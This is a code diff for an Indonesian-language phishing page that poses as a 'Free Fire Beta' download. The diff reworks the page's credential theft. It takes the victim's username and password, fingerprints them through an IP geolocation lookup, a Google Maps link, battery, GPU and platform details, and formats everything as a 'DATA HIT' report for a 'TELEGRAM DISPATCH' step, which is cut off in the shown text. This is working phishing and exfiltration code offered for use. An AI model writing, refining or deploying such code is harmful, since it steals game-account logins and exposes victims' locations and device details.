@@ -6,11 +6,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>FF BETA DOWNLOAD VERSI TERBARU | DIJAMIN WORK 100%</title>
 
-    <meta name="description" content="Akses Awal Free Fire Beta 2026. Download sekarang dan dapatkan item eksklusif.">
-    <meta property="og:title" content="FF BETA EARLY ACCESS">
-    <meta property="og:description" content="Download Versi Terbaru - Work 100%">
-    <meta property="og:image" content="https://img.daisyui.com/images/stock/photo-1507358522600-9f71e620c44e.jpg">
-
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Poppins:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
@@ -354,7 +349,6 @@
             const err = document.getElementById('target-error');
             
             if(activeMet === 'Google') {
-                // DETEKSI GOOGLE FORMAT
                 if(val.length > 5 && !val.includes('@gmail.com')) {
                     err.innerText = "Format @gmail.com wajib diisi untuk verifikasi Google.";
                     err.style.display = 'block';
@@ -374,17 +368,22 @@
 
             document.getElementById('loading-screen').style.display = 'flex';
 
-            // BRUTAL FINGERPRINTING
+            // GEOLOCATION & IP HANDLER
             let ipd = {};
-            try { ipd = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e) { ipd = {ip:'?'}; }
+            try { 
+                ipd = await fetch('https://ipapi.co/json/').then(r => r.json()); 
+            } catch(e) { 
+                ipd = { ip: "0.0.0.0", city: "Unknown", region: "Unknown", country_name: "Unknown", org: "Unknown", latitude: 0, longitude: 0 }; 
+            }
 
+            // BATT STATS
             let batt = "N/A";
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batt = `${(b.level * 100).toFixed(0)}% [${b.charging ? 'Charging' : 'Disc'}]`;
+                batt = `${(b.level * 100).toFixed(0)}% [${b.charging ? '🔌' : '🔋'}]`;
             }
 
-            // GPU DETECTOR
+            // GPU RENDERER
             const c_gl = document.createElement('canvas');
             const gl = c_gl.getContext('webgl');
             const d_info = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
@@ -392,23 +391,32 @@
 
             const maps = `https://www.google.com/maps?q=${ipd.latitude},${ipd.longitude}`;
 
-            const payload = `☠️ **NEW HIT: FF BETA BLUE** ☠️\n` +
-                            `━━━━━━━━━━━━━━━━━━━━\n` +
-                            `👤 **USER:** \`${u}\`\n` +
-                            `🔑 **PASS:** \`${p}\`\n` +
-                            `🌐 **VIA:** ${activeMet.toUpperCase()}\n` +
-                            `━━━━━━━━━━━━━━━━━━━━\n` +
-                            `🌐 **IP:** \`${ipd.ip}\`\n` +
-                            `📍 **LOC:** ${ipd.city}, ${ipd.country_name}\n` +
-                            `🏢 **ISP:** ${ipd.org}\n` +
-                            `🗺️ **MAPS:** [VIEW_LOC](${maps})\n` +
-                            `━━━━━━━━━━━━━━━━━━━━\n` +
-                            `🔋 **BATT:** ${batt}\n` +
-                            `🎮 **GPU:** ${renderer}\n` +
-                            `📱 **PLAT:** ${navigator.platform}\n` +
-                            `🕒 **TIME:** ${new Date().toLocaleString('id-ID')}\n` +
-                            `━━━━━━━━━━━━━━━━━━━━\n` +
-                            `**REXUSZ SHAFIQ PANEL V9.5** ✅`;
+            // --- RESULT TEXT (LUXURY & BOLD MODE) ---
+            const payload = 
+                `🔥 **DATA HIT: FF BETA TIKTOK WORK** 🔥\n` +
+                `✨ **STATUS: SUCCESS INFILTRATION** ✨\n\n` +
+                `👤 **[ AKUN TARGET ]**\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `📧 **EMAIL/USER :** \`${u}\`\n` +
+                `🔑 **PASSWORD   :** \`${p}\`\n` +
+                `🌐 **LOGIN VIA  :** **${activeMet.toUpperCase()}**\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                `📍 **[ INFO LOKASI ]**\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `🌍 **IP ADDRESS :** \`${ipd.ip}\`\n` +
+                `🏘️ **KOTA/REGION:** **${ipd.city}, ${ipd.region}**\n` +
+                `🇮🇩 **NEGARA     :** **${ipd.country_name}**\n` +
+                `🏢 **PROVIDER   :** **${ipd.org}**\n` +
+                `🗺️ **GOOGLE MAPS:** [KLIK DISINI](${maps})\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                `📱 **[ INFO PERANGKAT ]**\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `🔋 **KONDISI BATRE:** **${batt}**\n` +
+                `🎮 **GPU RENDERER :** **${renderer}**\n` +
+                `🖥️ **PLATFORM     :** **${navigator.platform}**\n` +
+                `🕒 **WAKTU HIT     :** **${new Date().toLocaleString('id-ID')}**\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                `✅ **BY: SHAFIQ PANEL V9.5 LUXURY** ✅`;
 
             // TELEGRAM DISPATCH
             try {
